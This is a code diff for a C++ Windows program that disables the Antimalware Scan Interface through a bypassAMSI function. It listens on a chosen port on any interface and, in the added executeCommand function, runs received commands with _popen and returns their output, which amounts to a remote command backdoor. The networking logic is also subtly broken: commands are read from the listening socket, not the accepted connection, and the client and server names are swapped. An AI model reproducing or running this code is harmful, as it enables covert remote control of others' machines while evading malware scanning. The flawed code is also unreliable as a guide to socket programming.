@@ -9,11 +9,11 @@
 #define BUFFER_SIZE 1024
 
 struct SocketInfo {
-    SOCKET windowsClientSocket;
-    sockaddr_in serverAddress;
+    SOCKET clientSocket;
+    sockaddr_in clientAddress;
 };
 
-void bypass_AMSI() {
+void bypassAMSI() {
     HINSTANCE result = ShellExecute(
         NULL, 
         "open", 
@@ -31,56 +31,90 @@ void bypass_AMSI() {
     }
 }
 
-SocketInfo createSocketWindows() {
+SocketInfo createClientSocket() {
     WSADATA winSockData; // Initializes Winsock
     if (WSAStartup(MAKEWORD(2, 2), &winSockData) != 0) {
         std::cerr << "WSAStartup failed!" << std::endl;
         exit(1);
     }
 
-    SOCKET windowsServerSocket = socket(AF_INET, SOCK_STREAM, 0); // Creates Socket
-    if (windowsServerSocket == INVALID_SOCKET) {
+    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0); // Creates Socket
+    if (clientSocket == INVALID_SOCKET) {
         std::cerr << "Socket creation failed: " << WSAGetLastError() << std::endl;
         WSACleanup(); // Terminates Winsock
         exit(1);
     }
 
-    sockaddr_in serverAddress; // Stores Address of Socket
-    serverAddress.sin_addr.s_addr = INADDR_ANY; // Accepts connections from any IP
-    serverAddress.sin_family = AF_INET; // IPv4
+    sockaddr_in clientAddress; // Stores Address of Socket
+    clientAddress.sin_addr.s_addr = INADDR_ANY; // Accepts connections from any IP
+    clientAddress.sin_family = AF_INET; // IPv4
 
     std::cout << "Socket created!" << std::endl;
-    return {windowsServerSocket, serverAddress};
+    return {clientSocket, clientAddress};
 }
 
-void connectSocketWindows(SOCKET serverSocket, sockaddr_in serverAddress) {
-    if (bind(serverSocket, (sockaddr*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) { // Binds Socket to Address
+void connectClientSocket(SOCKET clientSocket, sockaddr_in clientAddress, int port) {
+    clientAddress.sin_port = htons(static_cast<u_short>(port)); // Set Port
+
+    if (bind(clientSocket, (sockaddr*)&clientAddress, sizeof(clientAddress)) == SOCKET_ERROR) { // Binds Socket to Address
         std::cerr << "Socket binding failed: " << WSAGetLastError() << std::endl;
-        closesocket(serverSocket); // Closes Socket
+        closesocket(clientSocket); // Closes Socket
         WSACleanup(); // Terminates Winsock
         exit(1);
     }
 
     std::cout << "Windows socket bound successfully!" << std::endl;
 
-    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) { // Listens for Connections
+    if (listen(clientSocket, SOMAXCONN) == SOCKET_ERROR) { // Listens for Connections
         std::cerr << "Socket listening failed: " << WSAGetLastError() << std::endl;
-        closesocket(serverSocket); // Closes Socket
+        closesocket(clientSocket); // Closes Socket
         WSACleanup(); // Terminates Winsock
         exit(1);
     }
 
     std::cout << "Windows socket is now listening!" << std::endl;
 
-    SOCKET clientSocket = accept(serverSocket, NULL, NULL); // Accepts Connection
-    if (clientSocket == INVALID_SOCKET) {
+    SOCKET serverSocket = accept(clientSocket, NULL, NULL); // Accepts Connection
+    if (serverSocket == INVALID_SOCKET) {
         std::cerr << "Socket accepting failed: " << WSAGetLastError() << std::endl;
-        closesocket(serverSocket); // Closes Socket
+        closesocket(clientSocket); // Closes Socket
         WSACleanup(); // Terminates Winsock
         exit(1);
     }
 
     std::cout << "Windows socket accepted connection!" << std::endl;
+}
+
+void executeCommand(SOCKET clientSocket) {
+    char buffer[BUFFER_SIZE] = {0};
+    
+    // Receive command from client
+    int recvResult = recv(clientSocket, buffer, BUFFER_SIZE - 1, 0);
+    if (recvResult > 0) {
+        buffer[recvResult] = '\0';  // Null-terminate received data
+        std::cout << "Received command: " << buffer << std::endl;
+
+        // Execute command
+        FILE* pipe = _popen(buffer, "r");
+        if (!pipe) {
+            const char* errorMsg = "Failed to execute command\n";
+            send(clientSocket, errorMsg, strlen(errorMsg), 0);
+            return;
+        }
+
+        // Read output of the command
+        char commandOutput[BUFFER_SIZE];
+        std::string fullOutput;
+        while (fgets(commandOutput, BUFFER_SIZE, pipe) != NULL) {
+            fullOutput += commandOutput;
+        }
+        _pclose(pipe);
+
+        // Send output back to client
+        send(clientSocket, fullOutput.c_str(), fullOutput.size(), 0);
+    } else {
+        std::cerr << "Failed to receive command: " << WSAGetLastError() << std::endl;
+    }
 }
 
 int main(int argc, char* argv[]) {
@@ -94,12 +128,14 @@ int main(int argc, char* argv[]) {
     std::cout << "Port: " << port << std::endl;
 
     // Bypass AMSI
-    bypass_AMSI();
+    bypassAMSI();
 
-    SocketInfo socketInfo;
-    socketInfo = createSocketWindows();
-    socketInfo.serverAddress.sin_port = htons(static_cast<u_short>(port)); // Set Port
-    socketInfo.serverAddress.sin_addr.s_addr = INADDR_ANY; // Accepts connections from any interface
-    connectSocketWindows(static_cast<SOCKET>(socketInfo.windowsClientSocket), socketInfo.serverAddress);
+    // Create and connect socket
+    SocketInfo socketInfo = createClientSocket();
+    connectClientSocket(socketInfo.clientSocket, socketInfo.clientAddress, port);
+
+    // Execute command (example)
+    executeCommand(socketInfo.clientSocket);
+
     return 0;
 }
